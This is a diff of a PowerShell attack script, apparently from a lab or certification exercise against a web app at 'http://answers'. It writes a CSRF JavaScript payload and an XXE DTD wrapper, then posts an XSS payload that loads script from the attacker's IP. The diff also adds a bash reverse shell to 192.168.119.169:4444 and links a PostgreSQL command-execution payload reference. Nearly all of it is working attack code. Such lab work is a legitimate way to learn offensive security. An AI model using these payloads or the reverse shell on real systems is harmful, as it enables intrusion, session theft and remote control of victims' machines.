@@ -133,17 +133,18 @@ function runQuery(endpoint, cfg, query) {
       });   
   });
 }
-"@
-$csrf_payload = New-Item -ItemType File -Path "cucked.js" -Value $javascript -Force
+"@;
+$csrf_payload = New-Item -ItemType File -Path "cucked.js" -Value $javascript -Force;
 $xxe_payload = New-Item -ItemType File -Path "wrapper.dtd" -Value '<!ENTITY wrapper "%start;%file;%end;">' -Force;
+$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.name)'></script>";
+$reverse_shell = New-Item -ItemType File -Path 'shell.sh' -Value '/bin/bash -i >& /dev/tcp/192.168.119.169/4444 0>&1' -Force;
+Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1";
 
-$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.name)'></script>"
-Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"
+Write-Output "Sleeping for 30 seconds, start simulation";
+Start-Sleep -Seconds 30;
 
-Write-Output "Sleeping for 30 seconds, start simulation"
-Start-Sleep -Seconds 30
-
-Remove-Item -Path $csrf_payload.Name
-Remove-Item -Path $xxe_payload.Name
+Remove-Item -Path $csrf_payload.Name;
+Remove-Item -Path $xxe_payload.Name;
+Remove-Item -Path $reverse_shell.Name;
 
 # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution
